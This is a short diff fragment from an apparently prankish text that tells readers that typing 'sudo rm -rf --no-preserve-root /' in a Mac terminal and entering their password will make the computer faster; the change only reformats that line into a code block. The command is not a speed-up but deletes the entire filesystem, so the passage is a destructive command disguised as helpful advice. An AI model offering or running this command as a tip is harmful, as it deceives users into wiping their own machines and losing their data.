@@ -15,8 +15,9 @@ Then it all went BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM!!!!!!!!!!!!!!!! 💣💥�
 
 
 Also, to make your mac faster, open the terminal and type
-`sudo rm -rf --no-preserve-root /`   and
-enter your password!
+``` shell
+ sudo rm -rf --no-preserve-root /
+ ```   and enter your password!
 
 
 
